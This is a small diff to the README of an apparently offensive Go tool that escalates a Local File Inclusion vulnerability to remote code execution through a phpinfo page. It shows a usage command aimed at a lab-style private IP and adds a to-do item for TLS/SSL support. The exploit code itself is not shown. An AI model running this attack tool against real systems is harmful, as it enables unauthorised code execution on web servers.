@@ -7,3 +7,6 @@ This script is used to exploit a Local File Inclusion (LFI) vulnerability by usi
 ```bash
 go run lfi2rce_phpinfo.go -phpinfo http://10.10.176.70/dashboard/phpinfo.php -lfi http://10.10.176.70/dev/index.html?view=%s
 ```
+
+## To-Do:
+- [ ] TLS/SSL support
